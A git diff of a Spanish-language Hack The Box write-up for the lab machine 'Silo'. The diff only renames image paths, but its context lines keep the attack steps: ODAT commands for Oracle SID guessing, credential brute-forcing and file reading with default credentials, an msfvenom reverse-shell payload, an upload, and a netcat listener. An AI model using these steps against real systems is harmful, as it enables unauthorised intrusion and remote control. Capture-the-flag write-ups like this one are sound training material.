@@ -3,7 +3,7 @@ title: "Silo - WriteUp"
 date: Tue May 06 2025 21:30:00 GMT+0200 (Central European Summer Time)
 categories: [WriteUps, HTB, Windows]
 tags: [ctf, nmap, htb, reverse-shell, smb, msfvenom, windows, iis, bash, sudo]
-image: /assets/img/htb-writeups/Pasted image 20240214200234.png
+image: /assets/img/htb-writeups/Pasted-image-20240214200234.png
 ---
 
 {% include machine-info.html
@@ -13,7 +13,7 @@ image: /assets/img/htb-writeups/Pasted image 20240214200234.png
   platform="HTB"
 %}
 
-![Silo](/assets/img/htb-writeups/Pasted image 20240214200234.png)
+![Silo](/assets/img/htb-writeups/Pasted-image-20240214200234.png)
 
 ---
 
@@ -22,7 +22,7 @@ Tags:
 
 -------
 
-![SILO](/assets/img/htb-writeups/Pasted image 20240214200234.png)
+![SILO](/assets/img/htb-writeups/Pasted-image-20240214200234.png)
 
 Silo se centra principalmente en aprovechar Oracle para obtener un shell y escalar privilegios. Estaba pensado para completarse manualmente utilizando varias herramientas, sin embargo, Oracle Database Attack Tool simplifica enormemente el proceso, reduciendo sustancialmente la dificultad de la máquina.
 
@@ -103,7 +103,7 @@ Podemos lanzar el comando `$ odat all -s 10.129.95.188 -p 1521` pero vamos a hac
 $ odat sidguesser -s 10.129.95.188
 ```
 
-![SILO](/assets/img/htb-writeups/Pasted image 20240216125921.png)
+![SILO](/assets/img/htb-writeups/Pasted-image-20240216125921.png)
 
 2. Una vez tenemos un SID válido buscaremos credenciales válidas con fuerza bruta, podemos usar el diccionario que viene integrado con la herramienta o definir/convertir uno ya establecido como los de seclists en el formato xxxxx/xxxxx:
 
@@ -113,7 +113,7 @@ $ odat passwordguesser -s 10.129.95.188 -d XE
 $ odat passwordguesser -s 10.129.95.188 -d XE --accounts-file creds.txt
 ```
 
-![SILO](/assets/img/htb-writeups/Pasted image 20240216130519.png)
+![SILO](/assets/img/htb-writeups/Pasted-image-20240216130519.png)
 
 3. Tenemos credenciales válidas, ahora debemos probarlas para ver si tenemos ejecución de comandos o lectura de archivos. Empezaremos con la lectura de archivos. A veces las credenciales no tienen los permisos suficientes y hay que añadir la opción "-sysdba" para elevar privilegios y te permita ejecutar el comando como es en este caso:
 
@@ -121,7 +121,7 @@ $ odat passwordguesser -s 10.129.95.188 -d XE --accounts-file creds.txt
 $ odat utlfile -s 10.129.95.188 -d XE -U 'scott' -P 'tiger' --getFile /Windows/System32/Drivers/etc/ hosts hosts --sysdba
 ```
 
-![SILO](/assets/img/htb-writeups/Pasted image 20240216131248.png)
+![SILO](/assets/img/htb-writeups/Pasted-image-20240216131248.png)
 
 Para que no te de el WARNING lo puedes ejecutar con sudo o como root. El archivo lo copia en la ruta "/usr/share/odat/"
 
@@ -137,7 +137,7 @@ $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.50 LPORT=443 -f exe -
 $ odat utlfile -s 10.129.95.188 -d XE -U 'scott' -P 'tiger' --putFile /Windows/Temp reverse.exe reverse.exe --sysdba 
 ```
 
-![SILO](/assets/img/htb-writeups/Pasted image 20240216135206.png)
+![SILO](/assets/img/htb-writeups/Pasted-image-20240216135206.png)
 
 6. Nos ponemos a la escucha con netcat y rlwrap.
 
@@ -151,7 +151,7 @@ $ rlwrap nc -lnvp 443
 $ odat externaltable -s 10.129.95.188 -d XE -U 'scott' -P 'tiger' --exec /Windows/Temp reverse.exe --sysdba
 ```
 
-![SILO](/assets/img/htb-writeups/Pasted image 20240216135546.png)
+![SILO](/assets/img/htb-writeups/Pasted-image-20240216135546.png)
 
 Y pa dentro...
 
